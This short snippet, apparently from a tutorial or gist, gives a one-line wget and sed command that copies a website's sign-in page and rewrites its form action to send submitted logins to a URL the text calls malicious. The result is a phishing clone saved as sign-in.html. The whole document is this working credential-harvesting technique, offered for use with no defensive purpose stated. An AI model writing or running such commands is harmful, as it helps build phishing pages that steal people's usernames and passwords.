Run this on a sign in endpoint and it will retrieve the HTML contents, replace the form action endpoint with a malicious URL, and finally output everything to `sign-in.html`.

```
$ wget --quiet --output-document=/tmp/temp-sign-in-file http://example.com/user/sign_in && sed -e 's/action="[^"]*/action="https:\/\/example.com\/sign-in.php/g' /tmp/temp-sign-in-file > sign-in.html
```